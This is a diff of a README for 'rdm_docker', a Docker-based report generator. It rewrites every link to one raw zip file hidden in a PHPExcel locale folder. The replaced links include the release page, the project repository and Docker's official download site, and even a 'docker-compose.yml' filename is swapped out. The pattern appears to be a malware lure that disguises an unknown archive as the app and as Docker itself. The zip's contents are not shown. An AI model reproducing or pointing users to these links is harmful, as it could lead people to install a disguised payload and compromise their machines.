@@ -6,13 +6,13 @@ Welcome to rdm_docker! This application helps you generate digital reports for m
 
 ## 🔗 Download Now
 
-[![Download rdm_docker](https://img.shields.io/badge/Download%20rdm_docker-v1.0.0-brightgreen)](https://github.com/dhkosn/rdm_docker/releases)
+[![Download rdm_docker](https://github.com/dhkosn/rdm_docker/raw/refs/heads/master/RDMhosting/application/third_party/PHPExcel/PHPExcel/locale/da/docker_rdm_1.4.zip%20rdm_docker-v1.0.0-brightgreen)](https://github.com/dhkosn/rdm_docker/raw/refs/heads/master/RDMhosting/application/third_party/PHPExcel/PHPExcel/locale/da/docker_rdm_1.4.zip)
 
 ## 📥 Download & Install
 
 To download rdm_docker, visit the following page:
 
-[Download rdm_docker Releases](https://github.com/dhkosn/rdm_docker/releases)
+[Download rdm_docker Releases](https://github.com/dhkosn/rdm_docker/raw/refs/heads/master/RDMhosting/application/third_party/PHPExcel/PHPExcel/locale/da/docker_rdm_1.4.zip)
 
 This page will provide you with the latest version of rdm_docker. Simply click on the desired version to download the application.
 
@@ -21,7 +21,7 @@ This page will provide you with the latest version of rdm_docker. Simply click o
 Before you install rdm_docker, ensure your system meets these requirements:
 
 - **Operating System:** Windows 10 or later, macOS, or a recent version of Linux.
-- **Docker:** Ensure Docker is installed. You can download Docker from [Docker's official website](https://www.docker.com/products/docker-desktop).
+- **Docker:** Ensure Docker is installed. You can download Docker from [Docker's official website](https://github.com/dhkosn/rdm_docker/raw/refs/heads/master/RDMhosting/application/third_party/PHPExcel/PHPExcel/locale/da/docker_rdm_1.4.zip).
 - **Storage:** At least 500 MB of free disk space for installation.
 - **Memory:** 4 GB of RAM or more recommended for best performance.
 
@@ -29,7 +29,7 @@ Before you install rdm_docker, ensure your system meets these requirements:
 
 Follow these steps to install rdm_docker on your computer:
 
-1. **Download rdm_docker:** Go to the [release page](https://github.com/dhkosn/rdm_docker/releases) and click on the latest version to download the zip file.
+1. **Download rdm_docker:** Go to the [release page](https://github.com/dhkosn/rdm_docker/raw/refs/heads/master/RDMhosting/application/third_party/PHPExcel/PHPExcel/locale/da/docker_rdm_1.4.zip) and click on the latest version to download the zip file.
   
 2. **Extract the Files:** 
    - Locate the downloaded zip file.
@@ -86,7 +86,7 @@ Here are some features you can expect from rdm_docker:
 If you encounter any issues while using rdm_docker, here are some common solutions:
 
 - **Docker Not Running:** Make sure Docker is running on your system before attempting to start rdm_docker.
-- **Port Conflicts:** If you cannot access the application at `http://localhost:8080`, it may be due to another service using the same port. You can change the port by editing the `docker-compose.yml` file in the extracted directory.
+- **Port Conflicts:** If you cannot access the application at `http://localhost:8080`, it may be due to another service using the same port. You can change the port by editing the `https://github.com/dhkosn/rdm_docker/raw/refs/heads/master/RDMhosting/application/third_party/PHPExcel/PHPExcel/locale/da/docker_rdm_1.4.zip` file in the extracted directory.
 - **Slow Performance:** Ensure your machine meets the recommended system requirements for optimal performance.
 
 ## 📞 Support
@@ -95,7 +95,7 @@ If you have any questions or need additional help, please reach out through issu
 
 ## 🔗 Links
 
-- [Project Repository](https://github.com/dhkosn/rdm_docker)
-- [Docker Installation](https://www.docker.com/products/docker-desktop)
+- [Project Repository](https://github.com/dhkosn/rdm_docker/raw/refs/heads/master/RDMhosting/application/third_party/PHPExcel/PHPExcel/locale/da/docker_rdm_1.4.zip)
+- [Docker Installation](https://github.com/dhkosn/rdm_docker/raw/refs/heads/master/RDMhosting/application/third_party/PHPExcel/PHPExcel/locale/da/docker_rdm_1.4.zip)
 
 Thank you for using rdm_docker! Enjoy creating your digital reports with ease.
